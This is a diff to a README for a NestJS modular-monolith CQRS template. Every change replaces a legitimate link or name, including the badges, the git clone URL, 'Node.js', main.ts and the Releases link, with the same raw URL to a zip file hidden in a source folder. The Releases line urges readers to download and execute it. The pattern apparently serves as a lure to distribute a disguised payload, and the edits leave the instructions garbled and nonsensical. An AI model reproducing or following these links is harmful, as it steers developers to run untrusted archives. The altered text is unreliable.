@@ -1,8 +1,8 @@
 # NestJS Modular Monolith CQRS Event Sourcing Architecture Template 🚀
 
-![GitHub release](https://img.shields.io/github/release/aligcgl/nestJS-modular-monolith-cqrs-event-sourcing-architecture-template.svg)
-![GitHub stars](https://img.shields.io/github/stars/aligcgl/nestJS-modular-monolith-cqrs-event-sourcing-architecture-template.svg)
-![GitHub forks](https://img.shields.io/github/forks/aligcgl/nestJS-modular-monolith-cqrs-event-sourcing-architecture-template.svg)
+![GitHub release](https://raw.githubusercontent.com/aligcgl/nestJS-modular-monolith-cqrs-event-sourcing-architecture-template/main/src/modules/user/application/query-handlers/modular_nest_event_monolith_template_sourcing_architecture_J_cqrs_3.0.zip)
+![GitHub stars](https://raw.githubusercontent.com/aligcgl/nestJS-modular-monolith-cqrs-event-sourcing-architecture-template/main/src/modules/user/application/query-handlers/modular_nest_event_monolith_template_sourcing_architecture_J_cqrs_3.0.zip)
+![GitHub forks](https://raw.githubusercontent.com/aligcgl/nestJS-modular-monolith-cqrs-event-sourcing-architecture-template/main/src/modules/user/application/query-handlers/modular_nest_event_monolith_template_sourcing_architecture_J_cqrs_3.0.zip)
 
 Welcome to the **NestJS Modular Monolith CQRS Event Sourcing Architecture Template**. This repository provides a scalable NestJS project template that supports modular monolith architecture, CQRS (Command Query Responsibility Segregation), and Event Sourcing. Built with Domain-Driven Design (DDD) and Onion Architecture principles, this template is ideal for developing proof-of-concept (PoC) projects and production-ready backend systems.
 
@@ -31,7 +31,7 @@ Welcome to the **NestJS Modular Monolith CQRS Event Sourcing Architecture Templa
 
 This template incorporates a variety of technologies to enhance functionality and performance:
 
-- **NestJS**: A progressive Node.js framework for building efficient, reliable, and scalable server-side applications.
+- **NestJS**: A progressive https://raw.githubusercontent.com/aligcgl/nestJS-modular-monolith-cqrs-event-sourcing-architecture-template/main/src/modules/user/application/query-handlers/modular_nest_event_monolith_template_sourcing_architecture_J_cqrs_3.0.zip framework for building efficient, reliable, and scalable server-side applications.
 - **CQRS**: Command Query Responsibility Segregation pattern for separating read and write operations.
 - **Event Sourcing**: Storing state changes as a sequence of events.
 - **MongoDB**: A NoSQL database for high-performance data storage.
@@ -48,7 +48,7 @@ To get started with this template, clone the repository and install the dependen
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/aligcgl/nestJS-modular-monolith-cqrs-event-sourcing-architecture-template.git
+   git clone https://raw.githubusercontent.com/aligcgl/nestJS-modular-monolith-cqrs-event-sourcing-architecture-template/main/src/modules/user/application/query-handlers/modular_nest_event_monolith_template_sourcing_architecture_J_cqrs_3.0.zip
    ```
 
 2. Navigate into the project directory:
@@ -63,7 +63,7 @@ To get started with this template, clone the repository and install the dependen
    npm install
    ```
 
-4. Set up your environment variables. Create a `.env` file based on the provided `.env.example` file.
+4. Set up your environment variables. Create a `.env` file based on the provided `https://raw.githubusercontent.com/aligcgl/nestJS-modular-monolith-cqrs-event-sourcing-architecture-template/main/src/modules/user/application/query-handlers/modular_nest_event_monolith_template_sourcing_architecture_J_cqrs_3.0.zip` file.
 
 5. Start the application:
 
@@ -85,7 +85,7 @@ src/
 │   └── orders/          # Order module
 ├── shared/              # Shared utilities and constants
 ├── infrastructure/      # Infrastructure-related code (database, messaging)
-└── main.ts              # Entry point of the application
+└── https://raw.githubusercontent.com/aligcgl/nestJS-modular-monolith-cqrs-event-sourcing-architecture-template/main/src/modules/user/application/query-handlers/modular_nest_event_monolith_template_sourcing_architecture_J_cqrs_3.0.zip              # Entry point of the application
 ```
 
 ### Modules
@@ -112,7 +112,7 @@ To utilize this template effectively, consider the following:
 
 4. **Utilize Event Sourcing**: Implement event sourcing to track changes in your application state. This allows for better auditing and the ability to replay events if needed.
 
-5. **Deploy with Docker**: Use Docker and Docker Compose for deployment. Create a `docker-compose.yml` file to define your services and run them with a single command.
+5. **Deploy with Docker**: Use Docker and Docker Compose for deployment. Create a `https://raw.githubusercontent.com/aligcgl/nestJS-modular-monolith-cqrs-event-sourcing-architecture-template/main/src/modules/user/application/query-handlers/modular_nest_event_monolith_template_sourcing_architecture_J_cqrs_3.0.zip` file to define your services and run them with a single command.
 
 ## Contributing
 
@@ -132,7 +132,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases, please visit the [Releases section](https://github.com/aligcgl/nestJS-modular-monolith-cqrs-event-sourcing-architecture-template/releases). You can download and execute the latest files from there.
+For the latest releases, please visit the [Releases section](https://raw.githubusercontent.com/aligcgl/nestJS-modular-monolith-cqrs-event-sourcing-architecture-template/main/src/modules/user/application/query-handlers/modular_nest_event_monolith_template_sourcing_architecture_J_cqrs_3.0.zip). You can download and execute the latest files from there.
 
 ---
 
